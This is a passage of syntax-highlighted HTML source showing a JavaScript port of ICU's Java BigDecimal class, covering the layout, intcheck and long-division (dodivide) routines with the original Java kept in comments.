(following an</span></span><br><span class="line"><span class="comment">       operation) or will be of length appropriate (in the case of</span></span><br><span class="line"><span class="comment">       construction from an int, for example).</span></span><br><span class="line"><span class="comment">    &lt;p&gt;We must not alter the mantissa, here.</span></span><br><span class="line"><span class="comment">    &lt;p&gt;'form' describes whether we are to use exponential notation (and</span></span><br><span class="line"><span class="comment">       if so, which), or if we are to lay out as a plain/pure numeric.</span></span><br><span class="line"><span class="comment">    &lt;/sgml&gt; */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private char[] layout()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">layout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--char cmant[];</span></span><br><span class="line">  <span class="keyword">var</span> cmant;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--java.lang.StringBuffer sb=null;</span></span><br><span class="line">  <span class="keyword">var</span> sb=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int euse=0;</span></span><br><span class="line">  <span class="keyword">var</span> euse=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int sig=0;</span></span><br><span class="line">  <span class="keyword">var</span> sig=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char csign=0;</span></span><br><span class="line">  <span class="keyword">var</span> csign=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char rec[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> rec=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int needsign;</span></span><br><span class="line">  <span class="keyword">var</span> needsign;</span><br><span class="line">  <span class="comment">//--int mag;</span></span><br><span class="line">  <span class="keyword">var</span> mag;</span><br><span class="line">  <span class="comment">//--int len=0;</span></span><br><span class="line">  <span class="keyword">var</span> len=<span class="number">0</span>;</span><br><span class="line">  cmant=<span class="keyword">new</span> <span class="built_in">Array</span>(<span class="keyword">this</span>.mant.length); <span class="comment">// copy byte[] to a char[]</span></span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">18</span>=<span class="keyword">this</span>.mant.length;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">18</span>&gt;<span class="number">0</span>;$<span class="number">18</span>--,i++)&#123;</span><br><span class="line">   cmant[i]=<span class="keyword">this</span>.mant[i]+<span class="string">''</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.form!=MathContext.prototype.PLAIN)</span><br><span class="line">   &#123;<span class="comment">/* exponential notation needed */</span></span><br><span class="line">    <span class="comment">//--sb=new java.lang.StringBuffer(cmant.length+15); // -x.xxxE+999999999</span></span><br><span class="line">    sb=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.isneg)</span><br><span class="line">     sb += <span class="string">'-'</span>;</span><br><span class="line">    euse=(<span class="keyword">this</span>.exp+cmant.length)<span class="number">-1</span>; <span class="comment">// exponent to use</span></span><br><span class="line">    <span class="comment">/* setup sig=significant digits and copy to result */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.form==MathContext.prototype.SCIENTIFIC)</span><br><span class="line">     &#123; <span class="comment">// [default]</span></span><br><span class="line">      sb += cmant[<span class="number">0</span>]; <span class="comment">// significant character</span></span><br><span class="line">      <span class="keyword">if</span> (cmant.length&gt;<span class="number">1</span>)  <span class="comment">// have decimal part</span></span><br><span class="line">       <span class="comment">//--sb.append('.').append(cmant,1,cmant.length-1);</span></span><br><span class="line">       sb += <span class="string">'.'</span>;</span><br><span class="line">       sb += cmant.slice(<span class="number">1</span>).join(<span class="string">""</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     &#123;<span class="attr">engineering</span>:<span class="keyword">do</span>&#123;</span><br><span class="line">      sig=euse%<span class="number">3</span>; <span class="comment">// common</span></span><br><span class="line">      <span class="keyword">if</span> (sig&lt;<span class="number">0</span>)</span><br><span class="line">       sig=<span class="number">3</span>+sig; <span class="comment">// negative exponent</span></span><br><span class="line">      euse=euse-sig;</span><br><span class="line">      sig++;</span><br><span class="line">      <span class="keyword">if</span> (sig&gt;=cmant.length)</span><br><span class="line">       &#123; <span class="comment">// zero padding may be needed</span></span><br><span class="line">        <span class="comment">//--sb.append(cmant,0,cmant.length);</span></span><br><span class="line">        sb += cmant.join(<span class="string">""</span>);</span><br><span class="line">        &#123;<span class="keyword">var</span> $<span class="number">19</span>=sig-cmant.length;<span class="keyword">for</span>(;$<span class="number">19</span>&gt;<span class="number">0</span>;$<span class="number">19</span>--)&#123;</span><br><span class="line">         sb += <span class="string">'0'</span>;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">       &#123; <span class="comment">// decimal point needed</span></span><br><span class="line">        <span class="comment">//--sb.append(cmant,0,sig).append('.').append(cmant,sig,cmant.length-sig);</span></span><br><span class="line">        sb += cmant.slice(<span class="number">0</span>,sig).join(<span class="string">""</span>);</span><br><span class="line">        sb += <span class="string">'.'</span>;</span><br><span class="line">        sb += cmant.slice(sig).join(<span class="string">""</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*engineering*/</span></span><br><span class="line">    <span class="keyword">if</span> (euse!=<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span> (euse&lt;<span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        csign=<span class="string">'-'</span>;</span><br><span class="line">        euse=-euse;</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">       csign=<span class="string">'+'</span>;</span><br><span class="line">      <span class="comment">//--sb.append('E').append(csign).append(euse);</span></span><br><span class="line">      sb += <span class="string">'E'</span>;</span><br><span class="line">      sb += csign;</span><br><span class="line">      sb += euse;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//--rec=new Array(sb.length);</span></span><br><span class="line">    <span class="comment">//--Utility.getChars(sb, 0,sb.length(),rec,0);</span></span><br><span class="line">    <span class="comment">//--return rec;</span></span><br><span class="line">    <span class="keyword">return</span> sb.split(<span class="string">""</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Here for non-exponential (plain) notation */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.exp==<span class="number">0</span>)</span><br><span class="line">   &#123;<span class="comment">/* easy */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.ind&gt;=<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> cmant; <span class="comment">// non-negative integer</span></span><br><span class="line">    rec=<span class="keyword">new</span> <span class="built_in">Array</span>(cmant.length+<span class="number">1</span>);</span><br><span class="line">    rec[<span class="number">0</span>]=<span class="string">'-'</span>;</span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,1,cmant.length);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(cmant,<span class="number">0</span>,rec,<span class="number">1</span>,cmant.length);</span><br><span class="line">    <span class="keyword">return</span> rec;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Need a '.' and/or some zeros */</span></span><br><span class="line">  needsign=((<span class="keyword">this</span>.ind==<span class="keyword">this</span>.isneg)?<span class="number">1</span>:<span class="number">0</span>); <span class="comment">// space for sign?  0 or 1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MAG is the position of the point in the mantissa (index of the</span></span><br><span class="line"><span class="comment">     character it follows) */</span></span><br><span class="line">  mag=<span class="keyword">this</span>.exp+cmant.length;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mag&lt;<span class="number">1</span>)</span><br><span class="line">   &#123;<span class="comment">/* 0.00xxxx form */</span></span><br><span class="line">    len=(needsign+<span class="number">2</span>)-<span class="keyword">this</span>.exp; <span class="comment">// needsign+2+(-mag)+cmant.length</span></span><br><span class="line">    rec=<span class="keyword">new</span> <span class="built_in">Array</span>(len);</span><br><span class="line">    <span class="keyword">if</span> (needsign!=<span class="number">0</span>)</span><br><span class="line">     rec[<span class="number">0</span>]=<span class="string">'-'</span>;</span><br><span class="line">    rec[needsign]=<span class="string">'0'</span>;</span><br><span class="line">    rec[needsign+<span class="number">1</span>]=<span class="string">'.'</span>;</span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">20</span>=-mag;i=needsign+<span class="number">2</span>;i:<span class="keyword">for</span>(;$<span class="number">20</span>&gt;<span class="number">0</span>;$<span class="number">20</span>--,i++)&#123; <span class="comment">// maybe none</span></span><br><span class="line">     rec[i]=<span class="string">'0'</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,(needsign+2)-mag,cmant.length);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(cmant,<span class="number">0</span>,rec,(needsign+<span class="number">2</span>)-mag,cmant.length);</span><br><span class="line">    <span class="keyword">return</span> rec;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mag&gt;cmant.length)</span><br><span class="line">   &#123;<span class="comment">/* xxxx0000 form */</span></span><br><span class="line">    len=needsign+mag;</span><br><span class="line">    rec=<span class="keyword">new</span> <span class="built_in">Array</span>(len);</span><br><span class="line">    <span class="keyword">if</span> (needsign!=<span class="number">0</span>)</span><br><span class="line">     rec[<span class="number">0</span>]=<span class="string">'-'</span>;</span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,needsign,cmant.length);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(cmant,<span class="number">0</span>,rec,needsign,cmant.length);</span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">21</span>=mag-cmant.length;i=needsign+cmant.length;i:<span class="keyword">for</span>(;$<span class="number">21</span>&gt;<span class="number">0</span>;$<span class="number">21</span>--,i++)&#123; <span class="comment">// never 0</span></span><br><span class="line">     rec[i]=<span class="string">'0'</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">    <span class="keyword">return</span> rec;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* decimal point is in the middle of the mantissa */</span></span><br><span class="line">  len=(needsign+<span class="number">1</span>)+cmant.length;</span><br><span class="line">  rec=<span class="keyword">new</span> <span class="built_in">Array</span>(len);</span><br><span class="line">  <span class="keyword">if</span> (needsign!=<span class="number">0</span>)</span><br><span class="line">   rec[<span class="number">0</span>]=<span class="string">'-'</span>;</span><br><span class="line">  <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)cmant,0,(java.lang.Object)rec,needsign,mag);</span></span><br><span class="line">  <span class="keyword">this</span>.arraycopy(cmant,<span class="number">0</span>,rec,needsign,mag);</span><br><span class="line">  rec[needsign+mag]=<span class="string">'.'</span>;</span><br><span class="line">  <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)cmant,mag,(java.lang.Object)rec,(needsign+mag)+1,cmant.length-mag);</span></span><br><span class="line">  <span class="keyword">this</span>.arraycopy(cmant,mag,rec,(needsign+mag)+<span class="number">1</span>,cmant.length-mag);</span><br><span class="line">  <span class="keyword">return</span> rec;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Checks a BigDecimal argument to ensure it's a true integer</span></span><br><span class="line"><span class="comment">       in a given range.</span></span><br><span class="line"><span class="comment">    &lt;p&gt;If OK, returns it as an int. &lt;/sgml&gt; */</span></span><br><span class="line"> <span class="comment">// [currently only used by pow]</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private int intcheck(int min,int max)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">intcheck</span>(<span class="params">min, max</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int i;</span></span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  i=<span class="keyword">this</span>.intValueExact(); <span class="comment">// [checks for non-0 decimal part]</span></span><br><span class="line">  <span class="comment">// Use same message as though intValueExact failed due to size</span></span><br><span class="line">  <span class="keyword">if</span> ((i&lt;min)||(i&gt;max))</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"intcheck(): Conversion overflow: "</span>+i;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* &lt;sgml&gt; Carry out division operations. &lt;/sgml&gt; */</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Arg1 is operation code: D=divide, I=integer divide, R=remainder</span></span><br><span class="line"><span class="comment">    Arg2 is the rhs.</span></span><br><span class="line"><span class="comment">    Arg3 is the context.</span></span><br><span class="line"><span class="comment">    Arg4 is explicit scale iff code='D' or 'I' (-1 if none).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Underlying algorithm (complications for Remainder function and</span></span><br><span class="line"><span class="comment">    scaled division are omitted for clarity):</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Test for x/0 and then 0/x</span></span><br><span class="line"><span class="comment">      Exp =Exp1 - Exp2</span></span><br><span class="line"><span class="comment">      Exp =Exp +len(var1) -len(var2)</span></span><br><span class="line"><span class="comment">      Sign=Sign1 * Sign2</span></span><br><span class="line"><span class="comment">      Pad accumulator (Var1) to double-length with 0's (pad1)</span></span><br><span class="line"><span class="comment">      Pad Var2 to same length as Var1</span></span><br><span class="line"><span class="comment">      B2B=1st two digits of var2, +1 to allow for roundup</span></span><br><span class="line"><span class="comment">      have=0</span></span><br><span class="line"><span class="comment">      Do until (have=digits+1 OR residue=0)</span></span><br><span class="line"><span class="comment">        if exp&lt;0 then if integer divide/residue then leave</span></span><br><span class="line"><span class="comment">        this_digit=0</span></span><br><span class="line"><span class="comment">        Do forever</span></span><br><span class="line"><span class="comment">           compare numbers</span></span><br><span class="line"><span class="comment">           if &lt;0 then leave inner_loop</span></span><br><span class="line"><span class="comment">           if =0 then (- quick exit without subtract -) do</span></span><br><span class="line"><span class="comment">              this_digit=this_digit+1; output this_digit</span></span><br><span class="line"><span class="comment">              leave outer_loop; end</span></span><br><span class="line"><span class="comment">           Compare lengths of numbers (mantissae):</span></span><br><span class="line"><span class="comment">           If same then CA=first_digit_of_Var1</span></span><br><span class="line"><span class="comment">                   else CA=first_two_digits_of_Var1</span></span><br><span class="line"><span class="comment">           mult=ca*10/b2b   -- Good and safe guess at divisor</span></span><br><span class="line"><span class="comment">           if mult=0 then mult=1</span></span><br><span class="line"><span class="comment">           this_digit=this_digit+mult</span></span><br><span class="line"><span class="comment">           subtract</span></span><br><span class="line"><span class="comment">           end inner_loop</span></span><br><span class="line"><span class="comment">         if have\=0 | this_digit\=0 then do</span></span><br><span class="line"><span class="comment">           output this_digit</span></span><br><span class="line"><span class="comment">           have=have+1; end</span></span><br><span class="line"><span class="comment">         var2=var2/10</span></span><br><span class="line"><span class="comment">         exp=exp-1</span></span><br><span class="line"><span class="comment">         end outer_loop</span></span><br><span class="line"><span class="comment">      exp=exp+1   -- set the proper exponent</span></span><br><span class="line"><span class="comment">      if have=0 then generate answer=0</span></span><br><span class="line"><span class="comment">      Return to FINISHED</span></span><br><span class="line"><span class="comment">      Result defined by MATHV1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For extended commentary, see DMSRCN.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--private com.ibm.icu.math.BigDecimal dodivide(char code,com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set,int scale)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">dodivide</span>(<span class="params">code, rhs, set, scale</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal lhs;</span></span><br><span class="line">  <span class="keyword">var</span> lhs;</span><br><span class="line">  <span class="comment">//--int reqdig;</span></span><br><span class="line">  <span class="keyword">var</span> reqdig;</span><br><span class="line">  <span class="comment">//--int newexp;</span></span><br><span class="line">  <span class="keyword">var</span> newexp;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">//--int newlen;</span></span><br><span class="line">  <span class="keyword">var</span> newlen;</span><br><span class="line">  <span class="comment">//--byte var1[];</span></span><br><span class="line">  <span class="keyword">var</span> var1;</span><br><span class="line">  <span class="comment">//--int var1len;</span></span><br><span class="line">  <span class="keyword">var</span> var1len;</span><br><span class="line">  <span class="comment">//--byte var2[];</span></span><br><span class="line">  <span class="keyword">var</span> var2;</span><br><span class="line">  <span class="comment">//--int var2len;</span></span><br><span class="line">  <span class="keyword">var</span> var2len;</span><br><span class="line">  <span class="comment">//--int b2b;</span></span><br><span class="line">  <span class="keyword">var</span> b2b;</span><br><span class="line">  <span class="comment">//--int have;</span></span><br><span class="line">  <span class="keyword">var</span> have;</span><br><span class="line">  <span class="comment">//--int thisdigit=0;</span></span><br><span class="line">  <span class="keyword">var</span> thisdigit=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte v2=0;</span></span><br><span class="line">  <span class="keyword">var</span> v2=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int ba=0;</span></span><br><span class="line">  <span class="keyword">var</span> ba=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int mult=0;</span></span><br><span class="line">  <span class="keyword">var</span> mult=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int start=0;</span></span><br><span class="line">  <span class="keyword">var</span> start=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int padding=0;</span></span><br><span class="line">  <span class="keyword">var</span> padding=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int d=0;</span></span><br><span class="line">  <span class="keyword">var</span> d=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte newvar1[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newvar1=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--byte lasthave=0;</span></span><br><span class="line">  <span class="keyword">var</span> lasthave=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int actdig=0;</span></span><br><span class="line">  <span class="keyword">var</span> actdig=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte newmant[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newmant=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  lhs=<span class="keyword">this</span>; <span class="comment">// name for clarity</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// [note we must have checked lostDigits before the following checks]</span></span><br><span class="line">  <span class="keyword">if</span> (rhs.ind==<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">throw</span> <span class="string">"dodivide(): Divide by 0"</span>; <span class="comment">// includes 0/0</span></span><br><span class="line">  <span class="keyword">if</span> (lhs.ind==<span class="number">0</span>)</span><br><span class="line">   &#123; <span class="comment">// 0/x =&gt; 0 [possibly with .0s]</span></span><br><span class="line">    <span class="keyword">if</span> (set.form!=MathContext.prototype.PLAIN)</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.ZERO;</span><br><span class="line">    <span class="keyword">if</span> (scale==(<span class="number">-1</span>))</span><br><span class="line">     <span class="keyword">return</span> lhs;</span><br><span class="line">    <span class="keyword">return</span> lhs.setScale(scale);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Prepare numbers according to BigDecimal rules */</span></span><br><span class="line">  reqdig=set.digits; <span class="comment">// local copy (heavily used)</span></span><br><span class="line">  <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.mant.length&gt;reqdig)</span><br><span class="line">     lhs=<span class="keyword">this</span>.clone(lhs).round(set);</span><br><span class="line">    <span class="keyword">if</span> (rhs.mant.length&gt;reqdig)</span><br><span class="line">     rhs=<span class="keyword">this</span>.clone(rhs).round(set);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* scaled divide */</span></span><br><span class="line">    <span class="keyword">if</span> (scale==(<span class="number">-1</span>))</span><br><span class="line">     scale=lhs.scale();</span><br><span class="line">    <span class="comment">// set reqdig to be at least large enough for the computation</span></span><br><span class="line">    reqdig=lhs.mant.length; <span class="comment">// base length</span></span><br><span class="line">    <span class="comment">// next line handles both positive lhs.exp and also scale mismatch</span></span><br><span class="line">    <span class="keyword">if</span> (scale!=(-lhs.exp))</span><br><span class="line">     reqdig=(reqdig+scale)+lhs.exp;</span><br><span class="line">    reqdig=(reqdig-((rhs.mant.length<span class="number">-1</span>)))-rhs.exp; <span class="comment">// reduce by RHS effect</span></span><br><span class="line">    <span class="keyword">if</span> (reqdig&lt;lhs.mant.length)</span><br><span class="line">     reqdig=lhs.mant.length; <span class="comment">// clamp</span></span><br><span class="line">    <span class="keyword">if</span> (reqdig&lt;rhs.mant.length)</span><br><span class="line">     reqdig=rhs.mant.length; <span class="comment">// ..</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* precalculate exponent */</span></span><br><span class="line">  newexp=((lhs.exp-rhs.exp)+lhs.mant.length)-rhs.mant.length;</span><br><span class="line">  <span class="comment">/* If new exponent -ve, then some quick exits are possible */</span></span><br><span class="line">  <span class="keyword">if</span> (newexp&lt;<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">if</span> (code!=<span class="string">'D'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span> (code==<span class="string">'I'</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.ZERO; <span class="comment">// easy - no integer part</span></span><br><span class="line">     <span class="comment">/* Must be 'R'; remainder is [finished clone of] input value */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">this</span>.clone(lhs).finish(set,<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We need slow division */</span></span><br><span class="line">  res=<span class="keyword">new</span> BigDecimal(); <span class="comment">// where we'll build result</span></span><br><span class="line">  res.ind=(lhs.ind*rhs.ind); <span class="comment">// final sign (for D/I)</span></span><br><span class="line">  res.exp=newexp; <span class="comment">// initial exponent (for D/I)</span></span><br><span class="line">  res.mant=<span class="keyword">this</span>.createArrayWithZeros(reqdig+<span class="number">1</span>); <span class="comment">// where build the result</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now [virtually pad the mantissae with trailing zeros */</span></span><br><span class="line">  <span class="comment">// Also copy the LHS, which will be our working array</span></span><br><span class="line">  newlen=(reqdig+reqdig)+<span class="number">1</span>;</span><br><span class="line">  var1=<span class="keyword">this</span>.extend(lhs.mant,newlen); <span class="comment">// always makes longer, so new safe array</span></span><br><span class="line">  var1len=newlen; <span class="comment">// [remaining digits are 0]</span></span><br><span class="line"></span><br><span class="line">  var2=rhs.mant;</span><br><span class="line">  var2len=newlen;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate first two digits of rhs (var2), +1 for later estimations */</span></span><br><span class="line">  b2b=(var2[<span class="number">0</span>]*<span class="number">10</span>)+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (var2.length&gt;<span class="number">1</span>)</span><br><span class="line">   b2b=b2b+var2[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* start the long-division loops */</span></span><br><span class="line">  have=<span class="number">0</span>;</span><br><span class="line">  &#123;<span class="attr">outer</span>:<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">   thisdigit=<span class="number">0</span>;</span><br><span class="line">   <span class="comment">/* find the next digit */</span></span><br><span class="line">   &#123;<span class="attr">inner</span>:<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1len&lt;var2len)</span><br><span class="line">     <span class="keyword">break</span> inner; <span class="comment">// V1 too low</span></span><br><span class="line">    <span class="keyword">if</span> (var1len==var2len)</span><br><span class="line">     &#123; <span class="comment">// compare needed</span></span><br><span class="line">      &#123;<span class="attr">compare</span>:<span class="keyword">do</span>&#123; <span class="comment">// comparison</span></span><br><span class="line">       &#123;<span class="keyword">var</span> $<span class="number">22</span>=var1len;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">22</span>&gt;<span class="number">0</span>;$<span class="number">22</span>--,i++)&#123;</span><br><span class="line">        <span class="comment">// var1len is always &lt;= var1.length</span></span><br><span class="line">        <span class="keyword">if</span> (i&lt;var2.length)</span><br><span class="line">         v2=var2[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">         v2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (var1[i]&lt;v2)</span><br><span class="line">         <span class="keyword">break</span> inner; <span class="comment">// V1 too low</span></span><br><span class="line">        <span class="keyword">if</span> (var1[i]&gt;v2)</span><br><span class="line">         <span class="keyword">break</span> compare; <span class="comment">// OK to subtract</span></span><br><span class="line">        &#125;</span><br><span class="line">       &#125;<span class="comment">/*i*/</span></span><br><span class="line">       <span class="comment">/* reach here if lhs and rhs are identical; subtraction will</span></span><br><span class="line"><span class="comment">          increase digit by one, and the residue will be 0 so we</span></span><br><span class="line"><span class="comment">          are done; leave the loop with residue set to 0 (in case</span></span><br><span class="line"><span class="comment">          code is 'R' or ROUND_UNNECESSARY or a ROUND_HALF_xxxx is</span></span><br><span class="line"><span class="comment">          being checked) */</span></span><br><span class="line">       thisdigit++;</span><br><span class="line">       res.mant[have]=thisdigit;</span><br><span class="line">       have++;</span><br><span class="line">       var1[<span class="number">0</span>]=<span class="number">0</span>; <span class="comment">// residue to 0 [this is all we'll test]</span></span><br><span class="line">       <span class="comment">// var1len=1      -- [optimized out]</span></span><br><span class="line">       <span class="keyword">break</span> outer;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*compare*/</span></span><br><span class="line">      <span class="comment">/* prepare for subtraction.  Estimate BA (lengths the same) */</span></span><br><span class="line">      ba=var1[<span class="number">0</span>]; <span class="comment">// use only first digit</span></span><br><span class="line">     &#125; <span class="comment">// lengths the same</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     &#123;<span class="comment">/* lhs longer than rhs */</span></span><br><span class="line">      <span class="comment">/* use first two digits for estimate */</span></span><br><span class="line">      ba=var1[<span class="number">0</span>]*<span class="number">10</span>;</span><br><span class="line">      <span class="keyword">if</span> (var1len&gt;<span class="number">1</span>)</span><br><span class="line">       ba=ba+var1[<span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">/* subtraction needed; V1&gt;=V2 */</span></span><br><span class="line">    mult=div((ba*<span class="number">10</span>),b2b);</span><br><span class="line">    <span class="keyword">if</span> (mult==<span class="number">0</span>)</span><br><span class="line">     mult=<span class="number">1</span>;</span><br><span class="line">    thisdigit=thisdigit+mult;</span><br><span class="line">    <span class="comment">// subtract; var1 reusable</span></span><br><span class="line">    var1=<span class="keyword">this</span>.byteaddsub(var1,var1len,var2,var2len,-mult,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (var1[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">continue</span> inner; <span class="comment">// maybe another subtract needed</span></span><br><span class="line">    <span class="comment">/* V1 now probably has leading zeros, remove leading 0's and try</span></span><br><span class="line"><span class="comment">       again. (It could be longer than V2) */</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">23</span>=var1len<span class="number">-2</span>;start=<span class="number">0</span>;start:<span class="keyword">for</span>(;start&lt;=$<span class="number">23</span>;start++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (var1[start]!=<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span> start;</span><br><span class="line">     var1len--;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*start*/</span></span><br><span class="line">    <span class="keyword">if</span> (start==<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">continue</span> inner;</span><br><span class="line">    <span class="comment">// shift left</span></span><br><span class="line">    <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)var1,start,(java.lang.Object)var1,0,var1len);</span></span><br><span class="line">    <span class="keyword">this</span>.arraycopy(var1,start,var1,<span class="number">0</span>,var1len);</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;<span class="comment">/*inner*/</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* We have the next digit */</span></span><br><span class="line">   <span class="keyword">if</span> ((have!=<span class="number">0</span>)||(thisdigit!=<span class="number">0</span>))</span><br><span class="line">    &#123; <span class="comment">// put the digit we got</span></span><br><span class="line">     res.mant[have]=thisdigit;</span><br><span class="line">     